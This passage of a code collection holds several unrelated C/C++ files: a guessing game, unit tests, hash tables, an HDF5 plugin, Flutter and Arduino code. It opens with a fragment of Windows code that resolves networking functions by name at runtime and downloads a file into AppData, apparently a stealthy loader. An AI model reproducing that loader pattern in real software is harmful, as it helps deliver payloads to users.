funcs->InternetCloseHandle = (InternetCloseHandle_Func)get_func_by_name(hWinINet, \"InternetCloseHandle\");\r\n\r\n    if (!funcs->InternetOpenA || !funcs->InternetOpenUrlA || !funcs->InternetReadFile || !funcs->InternetCloseHandle || !funcs->wsprintfA)\r\n    {\r\n        funcs->FreeLibrary(hWinINet);\r\n        return FALSE;\r\n    }\r\n\r\n    return TRUE;\r\n}\r\n\r\nBOOL GetAppDataPath(Win32Funcs* funcs, char* appDataPath, DWORD size)\r\n{\r\n    return funcs->GetEnvironmentVariableA(\"APPDATA\", appDataPath, size);\r\n}\r\n\r\nBOOL DownloadFile(Win32Funcs* funcs, LPCSTR url, LPCSTR filePath)\r\n{\r\n    LPVOID hInternet = funcs->InternetOpenA(\"Meow\", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);\r\n    if (!hInternet)\r\n        return FALSE;\r\n\r\n    LPVOID hUrlFile = funcs->InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);\r\n    if (!hUrlFile)\r\n    {\r\n        funcs->InternetCloseHandle(hInternet);\r\n        return FALSE;\r\n    }\r\n\r\n    HANDLE hFile = funcs->CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\r\n    if (hFile == INVALID_HANDLE_VALUE)\r\n    {\r\n        funcs->InternetCloseHandle(hUrlFile);\r\n        funcs->InternetCloseHandle(hInternet);\r\n        return FALSE;\r\n    }\r\n\r\n    const DWORD bufferSize = 4096;\r\n\r\n    char* buffer = (char*)funcs->VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\r\n    if (!buffer) {\r\n        funcs->InternetCloseHandle(hUrlFile);\r\n        funcs->InternetCloseHandle(hInternet);\r\n        return FALSE;\r\n    }\r\n    my_memset(buffer, 0, bufferSize);\r\n    DWORD bytesRead, bytesWritten;\r\n    BOOL bResult = TRUE;\r\n\r\n    while (funcs->InternetReadFile(hUrlFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0)\r\n    {\r\n ",
    "#include<iostream>\r\n#include <cstdlib>  \r\n#include <ctime>    \r\nusing namespace std;\r\n\r\nint main () {\r\n    srand(static_cast<unsigned int>(time(0)));\r\n    int randomNumber = rand() % 100 + 1;\r\n    int guess = 0;\r\n    int attempts = 0;\r\n\r\n    string name;\r\n    cout << \"<><><><><><><>\";\r\n    cout<< \" Welcome to 'Guess the Number'!\";\r\n    cout << \"<><><><><><><>\" << endl;\r\n    cout << \"Enter player name : \";\r\n    cin>>name;\r\n    cout << \"I'm Thinking of a Number Between 1 to 100\" << endl;\r\n\r\n    for(int i=0;i<5;i++)\r\n    {\r\n        cout<< \"Enter your guess :\";\r\n        cin>> guess;\r\n\r\n       \r\n\r\n        if (guess > randomNumber)\r\n        {\r\n            cout<<\" It is too high ! Try again.\" << endl;\r\n        } else if (guess < randomNumber)\r\n        {\r\n            cout<<\"It is too low ! Try again.\" << endl;\r\n        }else\r\n        {\r\n            cout<< \"Yayyy Congratulations \"<<name <<\"! you guessed the number in \" << attempts << \" attempts\" << endl;\r\n            break;\r\n\r\n        }\r\n        attempts++;\r\n\r\n    }\r\n    if(attempts == 5)\r\n    {\r\n        cout << \"Better luck next time buddy.\"<<endl;\r\n        cout << \"The number I thought of was \" << randomNumber << endl;\r\n    }\r\n             \r\n     return 0;   \r\n\r\n    }\r\n    \r\n",
    "#include \"pch.h\"\n#include \"CppUnitTest.h\"\n\nextern \"C\" \n{\n#include \"../BCSRec/main.h\"\n}\nextern \"C\"\n{\n    void setLength(int input, int* length);\n    void setWidth(int input, int* width);\n    int getPerimeter(int* length, int* width);\n    int getArea(int* length, int* width);\n    void printWelcomeMenu();\n    void printOptions();\n    int getIntInput(char message[]);\n}\n\n\n\nusing namespace Microsoft::VisualStudio::CppUnitTestFramework;\n\nnamespace UnitBCSRecTests\n\n{\n    TEST_CLASS(RectangleTests) // Defines a test class for rectangle-related tests \n    {\n    public:\n        // Test method to verify the perimeter calculation\n        TEST_METHOD(TestGetPerimeter)\n        {\n            // Arrange: Set up the test inputs \n            int length = 10;\n            int width = 5;\n\n            // Act: Call the method under test \n            int perimeter = getPerimeter(&length, &width);\n\n            // Assert: Verify the expected outcome \n            Assert::AreEqual(30, perimeter);  // 10 + 10 + 5 + 5 = 30\n        }\n\n        TEST_METHOD(TestGetArea)\n        {\n            // Arrange\n            int length = 10;\n            int width = 5;\n\n            // Act\n            int area = getArea(&length, &width);\n\n            // Assert\n            Assert::AreEqual(50, area);  // 10 * 5 = 50\n        }\nTEST_METHOD(TestSetLength_Normal)\n                {\n                    // Arrange\n                    int length = 0;\n                    int input = 50;\n\n                    // Act\n                    setLength(input, &length);\n\n                    // Assert\n                    Assert::AreEqual(50, length);\n                }\n\n                TEST_METHOD(TestSetLength_UpperEdge)\n                {\n                    // Arrange\n                    int length = 0;\n                    int input = 99;\n\n                    // Act\n                    setLength(input, &length);\n\n                    // Assert\n                    Assert::AreEqual(99, length);\n                }\n\n                TEST_METHOD(TestSetLength_InvalidLow)\n                {\n                    // Arrange\n                    int length = 10;  // Initial value should remain unchanged\n                    int input = 0;\n\n                    // Act\n                    setLength(input, &length);\n\n                    // Assert\n                    Assert::AreEqual(10, length);  // Length should remain unchanged because input is invalid\n                }\n\n                // Tests for setWidth()\n                        // Tests for setWidth()\n                TEST_METHOD(TestSetWidth_Normal)\n                {\n                    // Arrange\n                    int width = 0;\n                    int input = 20;\n\n                    // Act\n                    setWidth(input, &width);\n\n                    // Assert\n                    Assert::AreEqual(20, width);\n                }\n\n                TEST_METHOD(TestSetWidth_LowerEdge)\n                {\n                    // Arrange  ``\n                    int width = 0;\n                    int input = 1;\n\n                    // Act\n                    setWidth(input, &width);\n\n                    // Assert\n                    Assert::AreEqual(1, width);\n                }\n\n                TEST_METHOD(TestSetWidth_InvalidHigh)\n                {\n                    // Arrange\n                    int width = 50;  // Initial value should remain unchanged\n                    int input = 101;\n\n                    // Act\n                    setWidth(input, &width);\n\n                    // Assert\n                    Assert::AreEqual(50, width);  // Width should remain unchanged because input is invalid\n        }\n    };\n}\n\n   \n\n\n\n\n\n\n",
    "#include \"HashTable.h\"\n#include <stdio.h>\n#include <math.h>\n#ifndef WIN64\n#include <string.h>\n#endif\n\n#define GET(hash,id) E[hash].items[id]\n\nHashTable::HashTable() {\n    memset(E, 0, sizeof(E));\n}\n\nvoid HashTable::Reset() {\n    for (uint32_t h = 0; h < HASH_SIZE; h++) {\n        if (E[h].items) {\n            for (uint32_t i = 0; i < E[h].nbItem; i++)\n                free(E[h].items[i]);\n        }\n        safe_free(E[h].items);\n        E[h].maxItem = 0;\n        E[h].nbItem = 0;\n    }\n}\n\nuint64_t HashTable::GetNbItem() {\n    uint64_t totalItem = 0;\n    for (uint64_t h = 0; h < HASH_SIZE; h++)\n        totalItem += (uint64_t)E[h].nbItem;\n    return totalItem;\n}\n\nENTRY* HashTable::CreateEntry(int256_t *x, int256_t *d, uint32_t kType) {\n    ENTRY* e = (ENTRY *)malloc(sizeof(ENTRY));\n    if (e == NULL) {\n        printf(\"Memory allocation failed\\n\");\n        exit(1);\n    }\n    e->x.i64[0] = x->i64[0];\n    e->x.i64[1] = x->i64[1];\n    e->x.i64[2] = x->i64[2];\n    e->x.i64[3] = x->i64[3];\n    e->d.i64[0] = d->i64[0];\n    e->d.i64[1] = d->i64[1];\n    e->d.i64[2] = d->i64[2];\n    e->d.i64[3] = d->i64[3];\n    e->kType = kType;\n    return e;\n}\n#define ADD_ENTRY(entry) {                 \\\n  /* Shift the end of the index table */   \\\n  for (int i = E[h].nbItem; i > st; i--)   \\\n    E[h].items[i] = E[h].items[i - 1];     \\\n  E[h].items[st] = entry;                  \\\n  E[h].nbItem++;                           \\\n}\n\nvoid HashTable::toint256t(Int *a, int256_t *b) {\n    b->i64[0] = a->bits64[0];\n    b->i64[1] = a->bits64[1];\n    b->i64[2] = a->bits64[2];\n    b->i64[3] = a->bits64[3];\n}\n\nvoid HashTable::toInt(int256_t *a, Int *b) {\n    b->bits64[0] = a->i64[0];\n    b->bits64[1] = a->i64[1];\n    b->bits64[2] = a->i64[2];\n    b->bits64[3] = a->i64[3];\n}\n\nvoid HashTable::Convert(Int *x, Int *d, int256_t *X, int256_t *D) {\n    toint256t(x, X);\n    toint256t(d, D);\n}\n\n#define AV1() if(pnb1) { ::fread(&e1, 32, 1, f1); pnb1--; }\n#define AV2() if(pnb2) { ::fread(&e2, 32, 1, f2); pnb2--; }\n\nint HashTable::MergeH(uint32_t h, FILE* f1, FILE* f2, FILE* fd, uint32_t* nbDP, uint32_t *duplicate, Int* d1, uint32_t* k1, Int* d2, uint32_t* k2) {\n    // Merge by line\n    // N comparison but avoid slow item allocation\n    // return ADD_OK or ADD_COLLISION if a COLLISION is detected\n    uint32_t nb1;\n    uint32_t m1;\n    uint32_t nb2;\n    uint32_t m2;\n    *duplicate = 0;\n    *nbDP = 0;\n    ::fread(&nb1, sizeof(uint32_t), 1, f1);\n    ::fread(&m1, sizeof(uint32_t), 1, f1);\n    ::fread(&nb2, sizeof(uint32_t), 1, f2);\n    ::fread(&m2, sizeof(uint32_t), 1, f2);\n\n    // Maximum in destination\n    uint32_t nbd = 0;\n    uint32_t md = nb1 + nb2;\n    if (md == 0) {\n        ::fwrite(&md, sizeof(uint32_t), 1, fd);\n        ::fwrite(&md, sizeof(uint32_t), 1, fd);\n        return ADD_OK;\n    }\n    ENTRY* output = (ENTRY *)malloc(md * sizeof(ENTRY));\n    if (output == NULL) {\n        printf(\"Memory allocation failed\\n\");\n        exit(1);\n    }\n    ENTRY e1;\n    ENTRY e2;\n    uint32_t pnb1 = nb1;\n    uint32_t pnb2 = nb2;\n    AV1();\n    AV2();\n    bool end1 = (nb1 == 0);\n    bool end2 = (nb2 == 0);\n    bool collisionFound = false;\n    while (!(end1 && end2)) {\n        if (!end1 && !end2) {\n            int comp = compare(&e1.x, &e2.x);\n            if (comp < 0) {\n                memcpy(output + nbd, &e1, 32);\n                nbd++;\n                AV1();\n                nb1--;\n            } else if (comp == 0) {\n                if ((e1.d.i64[0] == e2.d.i64[0]) && (e1.d.i64[1] == e2.d.i64[1]) && (e1.d.i64[2] == e2.d.i64[2]) && (e1.d.i64[3] == e2.d.i64[3])) {\n                    *duplicate = *duplicate + 1;\n                } else {\n                    // Collision\n                    *k1 = e1.kType;\n                    *k2 = e2.kType;\n                    CalcDist(&(e1.d), d1);\n                    CalcDist(&(e2.d), d2);\n                    collisionFound = true;\n                }\n                memcpy(output + nbd, &e1, 32);\n                nbd++;\n                AV1();\n                AV2();\n                nb1--;\n                nb2--;\n            } else {\n                memcpy(output + nbd, &e2, 32);\n                nbd++;\n                AV2();\n                nb2--;\n            }\n        } else if (!end1 && end2) {\n            memcpy(output + nbd, &e1, 32);\n            nbd++;\n            AV1();\n            nb1--;\n        } else if (end1 && !end2) {\n            memcpy(output + nbd, &e2, 32);\n            nbd++;\n            AV2();\n            nb2--;\n        }\n        end1 = (nb1 == 0);\n        end2 = (nb2 == 0);\n    }\n    // write output\n    // Round md to next multiple of 4\n    if (nbd % 4 == 0) {\n        md = nbd;\n    } else {\n        md = ((nbd / 4) + 1) * 4;\n    }\n    ::fwrite(&nbd, sizeof(uint32_t), 1, fd);\n    ::fwrite(&md, sizeof(uint32_t), 1, fd);\n    ::fwrite(output, 32, nbd, fd);\n    free(output);\n    *nbDP = nbd;\n    return (collisionFound ? ADD_COLLISION : ADD_OK);\n}\n\nint HashTable::Add(Int *x, Int *d, uint32_t type) {\n    int256_t X;\n    int256_t D;\n    C",
    "\ufeff#include <iostream>\n#include <vector>\n#include <stdexcept>\n#include <sstream> // for std::istringstream\n#include <cstring> // for std::strlen\nusing namespace std;\n\nclass CuckooHash {\nprivate:\n    int size;                     // \u54c8\u5e0c\u8868\u7684\u5927\u5c0f\n    int count;                    // \u5f53\u524d\u5b58\u50a8\u7684\u5143\u7d20\u6570\u91cf\n    vector<int> table1;           // \u7b2c\u4e00\u4e2a\u54c8\u5e0c\u8868\n    vector<int> table2;           // \u7b2c\u4e8c\u4e2a\u54c8\u5e0c\u8868\n    int hash1(int key) { return key % size; } // \u7b2c\u4e00\u4e2a\u54c8\u5e0c\u51fd\u6570\n    int hash2(int key) { return (key / size) % size; } // \u7b2c\u4e8c\u4e2a\u54c8\u5e0c\u51fd\u6570\n\npublic:\n    CuckooHash(int sz) : size(sz), count(0) {\n        table1.resize(size, -1);\n        table2.resize(size, -1);\n    }\n\n    void insert(int key) {\n        if (count >= size) { // \u68c0\u67e5\u5f53\u524d\u5143\u7d20\u6570\u91cf\u662f\u5426\u8fbe\u5230\u5bb9\u91cf\n            throw runtime_error(\"Insertion failed. Hash table is full.\");\n        }\n\n        int pos1 = hash1(key);\n        if (table1[pos1] == -1) {\n            table1[pos1] = key;\n            count++; // \u589e\u52a0\u5143\u7d20\u8ba1\u6570\n            return;\n        }\n\n        int displaced = table1[pos1];\n        table1[pos1] = key;\n\n        for (int i = 0; i < size; ++i) {\n            int pos2 = hash2(displaced);\n            if (table2[pos2] == -1) {\n                table2[pos2] = displaced;\n                count++; // \u589e\u52a0\u5143\u7d20\u8ba1\u6570\n                return;\n            }\n\n            swap(displaced, table2[pos2]);\n            pos1 = hash1(displaced);\n            if (table1[pos1] == -1) {\n                table1[pos1] = displaced;\n                count++; // \u589e\u52a0\u5143\u7d20\u8ba1\u6570\n                return;\n            }\n\n            swap(displaced, table1[pos1]);\n        }\n\n        throw runtime_error(\"Cycle detected. Rehash required.\");\n    }\n\n    bool find(int key) {\n        return table1[hash1(key)] == key || table2[hash2(key)] == key;\n    }\n\n    void remove(int key) {\n        int pos1 = hash1(key);\n        if (table1[pos1] == key) {\n            table1[pos1] = -1;\n            count--; // \u51cf\u5c11\u5143\u7d20\u8ba1\u6570\n            return;\n        }\n\n        int pos2 = hash2(key);\n        if (table2[pos2] == key) {\n            table2[pos2] = -1;\n            count--; // \u51cf\u5c11\u5143\u7d20\u8ba1\u6570\n        }\n    }\n\n    int getCount() const { // \u83b7\u53d6\u5f53\u524d\u5143\u7d20\u6570\u91cf\n        return count;\n    }\n};\n\n// \u51fd\u6570\uff1a\u6e05\u7406\u8f93\u5165\u5b57\u7b26\u4e32\nvoid trim(string& str) {\n    str.erase(0, str.find_first_not_of(\" \\n\\r\\t\"));\n    str.erase(str.find_last_not_of(\" \\n\\r\\t\") + 1);\n}\n\nint main() {\n    int size;\n    cout << \"Enter the size of the hash table: \";\n    cin >> size;\n    cin.ignore(); // \u6e05\u9664\u8f93\u5165\u7f13\u51b2\u533a\u4e2d\u7684\u6362\u884c\u7b26\n\n    CuckooHash hashTable(size);\n    string input;\n\n    cout << \"Please input a command: insert <key> <key> ..., find <key>, remove <key>, or exit\" << endl;\n\n    while (true) {\n        cout << \">> \";\n        getline(cin, input); // \u83b7\u53d6\u6574\u884c\u8f93\u5165\n        trim(input); // \u6e05\u7406\u8f93\u5165\u5b57\u7b26\u4e32\n\n        if (input.empty()) {\n            cout << \"Error: Empty input. Please enter a valid command.\" << endl;\n            continue;\n        }\n\n        stringstream ss(input); // \u4f7f\u7528 stringstream \u89e3\u6790\u8f93\u5165\n        string command;\n        ss >> command; // \u83b7\u53d6\u547d\u4ee4\n\n        if (command == \"insert\") {\n            int key;\n            while (ss >> key) { // \u8bfb\u53d6\u6240\u6709\u7684\u952e\n                try {\n                    hashTable.insert(key);\n                    cout << \"Success: \" << key << \" has been successfully inserted into the hash table.\" << endl;\n                    cout << \"Current number of elements: \" << hashTable.getCount() << endl; // \u663e\u793a\u5f53\u524d\u5143\u7d20\u6570\u91cf\n                    if (hashTable.getCount() < 0) {\n                        cout << \"Error: Element count is negative. Exiting program.\" << endl;\n                        return 1; // \u9000\u51fa\u7a0b\u5e8f\n                    }\n                }\n                catch (const runtime_error& e) {\n                    cout << \"Error: \" << e.what() << \" for key \" << key << \". Please try again.\" << endl;\n                }\n            }\n        }\n        else if (command == \"find\") {\n            int key;\n            ss >> key; // \u8bfb\u53d6\u67e5\u627e\u7684\u952e\n            if (hashTable.find(key)) {\n                cout << \"Success: \" << key << \" is present in the hash table.\" << endl;\n            }\n            else {\n                cout << \"Error: \" << key << \" is not found in the hash table.\" << endl;\n            }\n        }\n        else if (command == \"remove\") {\n            int key;\n            ss >> key; // \u8bfb\u53d6\u5220\u9664\u7684\u952e\n            if (hashTable.find(key)) {\n                hashTable.remove(key);\n                cout << \"Removed \" << key << endl;\n                cout << \"Current number of elements: \" << hashTable.getCount() << endl; // \u663e\u793a\u5f53\u524d\u5143\u7d20\u6570\u91cf\n                if (hashTable.getCount() < 0) {\n                    cout << \"Error: Element count is negative. Exiting program.\" << endl;\n                    return 1; // \u9000\u51fa\u7a0b\u5e8f\n                }\n            }\n            else {\n                cout << \"Error: \" << key << \" not found, cannot remove.\" << endl;\n            }\n        }\n        else if (command == \"exit\") {\n            break; // \u9000\u51fa\u5faa\u73af\n        }\n        else {\n            cout << \"Unknown command. Available commands: insert <key> <key>..., find <key>, remove <key>, exit.\" << endl;\n        }\n    }\n    return 0;\n}\n",
    "/*\n * University of Illinois Open Source License\n * Copyright 2018-2018 Luthey-Schulten Group,\n * All rights reserved.\n *\n * Developed by: Luthey-Schulten Group\n * \t\t\t     University of Illinois at Urbana-Champaign\n * \t\t\t     http://www.scs.uiuc.edu/~schulten\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy of\n * this software and associated documentation files (the Software), to deal with\n * the Software without restriction, including without limitation the rights to\n * use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies\n * of the Software, and to permit persons to whom the Software is furnished to\n * do so, subject to the following conditions:\n *\n * - Redistributions of source code must retain the above copyright notice,\n * this list of conditions and the following disclaimers.\n *\n * - Redistributions in binary form must reproduce the above copyright notice,\n * this list of conditions and the following disclaimers in the documentation\n * and/or other materials provided with the distribution.\n *\n * - Neither the names of the Luthey-Schulten Group, University of Illinois at\n * Urbana-Champaign, nor the names of its contributors may be used to endorse or\n * promote products derived from this Software without specific prior written\n * permission.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL\n * THE CONTRIBUTORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR\n * OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,\n * ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\n * OTHER DEALINGS WITH THE SOFTWARE.\n *\n * Author(s): Tyler M. Earnest\n */\n\n#include <cmath>\n#include <cstdarg>\n#include <cstdio>\n#include <cstring>\n#include <ctime>\n\n#include <algorithm>\n#include <exception>\n#include <numeric>\n#include <set>\n#include <sstream>\n#include <string>\n#include <variant>\n#include <vector>\n\n#include <hdf5.h>\n#include <hdf5_hl.h>\n\n#include \"molfile_plugin.h\"\n#include \"vmdconio.h\"\n\nnamespace {\n\n#define MAX_VMD_NAME 16\n#define RDME_RADIUS_SCALE 0.1\n#define TO_ANGSTROM 1e10\n#define MAX_LMPEXC_MSG 256\n\ntypedef std::variant<uint32_t, uint8_t> particle_int_t;\ntypedef unsigned char site_int_t;\n\n#define partial_val(x) (std::holds_alternative<uint32_t>(x) ? std::get<uint32_t>(x) : std::get<uint8_t>(x))\n\nclass LMPException : public std::exception {\nprotected:\n    char msg[MAX_LMPEXC_MSG];\npublic:\n    void vmdcon_report() { vmdcon_printf(VMDCON_ERROR, \"LMPlugin) Error: %s\\n\", msg); }\n};\n\nclass Exception : public LMPException {\npublic:\n    Exception(const char *fmt, ...)\n    {\n        va_list ap;\n        va_start(ap, fmt);\n        vsnprintf(msg, sizeof(msg), fmt, ap);\n        va_end(ap);\n    }\n};\n\nclass H5Exception : public LMPException {\n    static herr_t\n    walk_cb(unsigned int n,\n            const H5E_error2_t *err,\n            void *data)\n    {\n        if (n == 0) {\n            snprintf(static_cast<char*>(data), MAX_LMPEXC_MSG, \"HDF5: %s: %s\",\n                    err->func_name, err->desc);\n        }\n        return 0;\n    }\n\npublic:\n    H5Exception() { H5Ewalk2(H5E_DEFAULT, H5E_WALK_DOWNWARD, H5Exception::walk_cb, msg); }\n};\n\n#define H5_CALL_ASSIGN(val, call)                                                                  \\\n    do {                                                                                           \\\n        val = (call);                                                                              \\\n        if (val < 0) {                                                                             \\\n            throw H5Exception();                                                                   \\\n        }                                                                                          \\\n    } while (0)\n\n#define H5_CALL(call)                                                                              \\\n    do {                                                                                           \\\n        hid_t val;                                                                                 \\\n        H5_CALL_ASSIGN(val, (call));                                                               \\\n    } while (0)\n\n\nstruct Timer {\n    // using low resolution time() to avoid portability issues\n    time_t start, end;\n\n    Timer() { reset(); }\n    void reset() { time(&start); }\n\n    int\n    elapsed()\n    {\n        time(&end);\n        return end-start;\n    }\n};\n\nnamespace H5File_specialized {\n\ntemplate <typename T> hid_t get_type_id();\ntemplate <> inline hid_t get_type_id<char>() { return H5T_STD_I8LE; }\ntemplate <> inline hid_t get_type_id<unsigned char>() { return H5T_STD_U8LE; }\ntemplate <> inline hid_t get_type_id<int>() { return H5T_STD_I32LE; }\ntemplate <> inline hid_t get_type_id<unsigned int>() { return H",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"laab2\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\n#include <unordered_map>\n#include <vector>\n#include \"IPQ.h\"\nusing namespace std;\n\nint main() {\n\n    vector<string> taskIDs;\n    taskIDs.push_back(\"Task1\");\n    taskIDs.push_back(\"Task2\");\n    taskIDs.push_back(\"Task3\");\n    taskIDs.push_back(\"Task4\");\n    taskIDs.push_back(\"Task5\");\n\n    vector<int> priorities;\n    priorities.push_back(5);\n    priorities.push_back(3);\n    priorities.push_back(7);\n    priorities.push_back(2);\n    priorities.push_back(6);\n\n\n    IPQ<> ipq(taskIDs, priorities);\n\n    // show the task IDs and priorities are being inserted properly\n    cout << \"Initial IPQ: \" << endl;\n    ipq.display();\n\n    cout << \"\\nIs the IPQ empty? \" << (ipq.isEmpty()? \"Yes\" : \"No\") << endl; \n\n    // show getMin returns correct value\n    cout << \"Root Task: \" << ipq.getMin() << endl; \n\n    ipq.insert(\"Task10\", 9);\n    ipq.insert(\"Task7\", 1);\n    ipq.insert(\"Task6\", 4);\n\n    cout << endl;\n    ipq.updatePriority(\"Task1\", 8);\n    ipq.updatePriority(\"Task7\", 15); // update priority at root\n    cout << endl;\n    ipq.display();\n    cout << endl;\n    \n    ipq.insert(\"Task3\", 16); // duplicate taskIDs are not inserted\n    ipq.insert(\"Task12\", 4); // duplicate priorities is allowed \n    ipq.insert(\"Task13\", 10);\n    ipq.insert(\"Task8\", 7);\n    ipq.insert(\"Task9\", 11); \n    cout << \"Root Task: \" << ipq.getMin() << endl; // root Task4\n    cout << \"After four insertions, the current size of the IPQ: \" << ipq.get_size() << endl;\n\n    ipq.remove(\"Task3\");\n    ipq.remove(\"Task4\");\n    cout << \"\\nAfter removing Task3 and Task4: \" << endl; \n    ipq.display();\n\n    cout << \"\\nRoot Task: after removals \" << ipq.getMin() << endl;\n\n    // make sure removing in the correct order\n    while (!ipq.isEmpty()) {\n    \n        string minTask = ipq.deleteMin();\n        if(!ipq.isEmpty()) {\n            cout << \"Just removed: \" << minTask << endl;\n        }\n    }\n\n    // test the clear function\n    IPQ<> ipq2(taskIDs, priorities);\n    cout << endl; \n    ipq2.display();\n    ipq2.clear();\n    cout << \"After clear operation, is the IPQ empty? \" << (ipq2.isEmpty()? \"Yes\" : \"No\") << endl; \n\n    return 0;\n}",
    "#include <Arduino.h>\n#include <WiFi.h>\n#include <HTTPClient.h>\n#include <ArduinoJson.h>\n\n/*\n * This program detects knock patterns and communicates with a FastAPI server.\n *\n * Hardware connections:\n * - GPIO36 (ADC1_CH0): Piezo sensor (connected to ground with a 1M\u03a9 pulldown resistor)\n * - GPIO21: Programming switch to enter a new code (short this pin to enter programming mode)\n * - GPIO16: Red LED indicator\n * - GPIO17: Green LED indicator\n */\n\n// Pin definitions\nconst int knockSensorPin = 36;  // Piezo sensor connected to GPIO36 (ADC1_CH0)\nconst int programSwitchPin = 21; // Programming mode switch connected to GPIO21\nconst int redLedPin = 16;       // Red LED connected to GPIO16\nconst int greenLedPin = 17;     // Green LED connected to GPIO17\n\n// Configuration constants\nint knockThreshold = 100;          // Minimum signal from the piezo to register as a knock\nint knockFadeTime = 150;         // Milliseconds to allow a knock to fade\nconst int maxKnocks = 20;              // Maximum number of knocks to listen for\nint defaultKnockTimeout = 1200;  // Default time to wait for a knock sequence\n\n// Variables\nint knockTimes[maxKnocks];                             // Array to store knock intervals\nint sensorValue = 0;                                   // Last reading of the knock sensor\nbool isProgrammingMode = false;                        // Flag for programming mode\n\n// WiFi credentials\nconst char* ssid = \"Your SS-ID\";         // Replace with your SSID\nconst char* password = \"password\"; // Replace with your Wi-Fi password\n\n// Server details\nconst char* serverName = \"http://192.168.0.105:7500\"; // Replace with your server's IP and port\n\n// Function Prototypes\nvoid setupWiFi();\nvoid listenToKnocks(int timeout);\nvoid sendKnockSequence(int* knocks, int count, int timeout);\nvoid updateConfigurations(JsonObject config);\n\nvoid setup()\n{\n    pinMode(redLedPin, OUTPUT);\n    pinMode(greenLedPin, OUTPUT);\n    pinMode(programSwitchPin, INPUT_PULLUP); // Use internal pull-up resistor\n\n    Serial.begin(115200);\n    Serial.println(\"Program started.\");\n\n    digitalWrite(greenLedPin, HIGH); // Green LED on, system is ready\n\n    // Initialize WiFi\n    setupWiFi();\n}\n\nvoid loop()\n{\n    // Read the knock sensor value\n    sensorValue = analogRead(knockSensorPin);\n\n    // Check if we are in programming mode\n    if (digitalRead(programSwitchPin) == LOW)\n    { // Active LOW due to pull-up resistor\n        isProgrammingMode = true;\n        digitalWrite(redLedPin, HIGH); // Turn on the red LED\n    }\n    else\n    {\n        isProgrammingMode = false;\n        digitalWrite(redLedPin, LOW);\n    }\n\n    // If the sensor value exceeds the threshold, start listening for the knock pattern\n    if (sensorValue >= knockThreshold)\n    {\n        listenToKnocks(defaultKnockTimeout);\n    }\n}\n\n// Function to connect to WiFi\nvoid setupWiFi() {\n    delay(10);\n    Serial.println();\n    Serial.print(\"Connecting to \");\n    Serial.println(ssid);\n\n    WiFi.begin(ssid, password);\n\n    while (WiFi.status() != WL_CONNECTED) {\n        delay(500);\n        Serial.print(\".\");\n    }\n\n    Serial.println(\"\\nWiFi connected\");\n    Serial.print(\"IP address: \");\n    Serial.println(WiFi.localIP());\n}\n\n// Function to record and process knock sequences\nvoid listenToKnocks(int timeout)\n{\n    Serial.println(\"Listening for knocks...\");\n\n    // Reset the knock times array\n    memset(knockTimes, 0, sizeof(knockTimes));\n\n    int knockCount = 0;                 // Number of knocks recorded\n    unsigned long startTime = millis(); // Reference for when this knock started\n    unsigned long currentTime = millis();\n\n    // Blink the LEDs as a visual indicator of the knock\n    digitalWrite(greenLedPin, LOW);\n    if (isProgrammingMode)\n    {\n        digitalWrite(redLedPin, LOW);\n    }\n    delay(knockFadeTime);\n    digitalWrite(greenLedPin, HIGH);\n    if (isProgrammingMode)\n    {\n        digitalWrite(redLedPin, HIGH);\n    }\n\n    do\n    {\n        // Listen for the next knock or wait for it to timeout\n        sensorValue = analogRead(knockSensorPin);\n        if (sensorValue >= knockThreshold)\n        { // Another knock detected\n            // Record the delay time\n            Serial.println(\"Knock detected.\");\n            Serial.println(sensorValue);\n            currentTime = millis();\n            knockTimes[knockCount] = currentTime - startTime;\n            knockCount++; // Increment the counter\n            startTime = currentTime;\n\n            // Reset our timer for the next knock\n            digitalWrite(greenLedPin, LOW);\n            if (isProgrammingMode)\n            {\n                digitalWrite(redLedPin, LOW);\n            }\n            delay(knockFadeTime); // A little delay to let the knock decay\n            digitalWrite(greenLedPin, HIGH);\n            if (isProgrammingMode)\n            {\n                digitalWrite(redLedPin, HIGH);\n            }\n        }\n        currentTime = millis();\n        // Check if we timed out or ran out of knocks\n    } while ((currentTime - startTime < ",
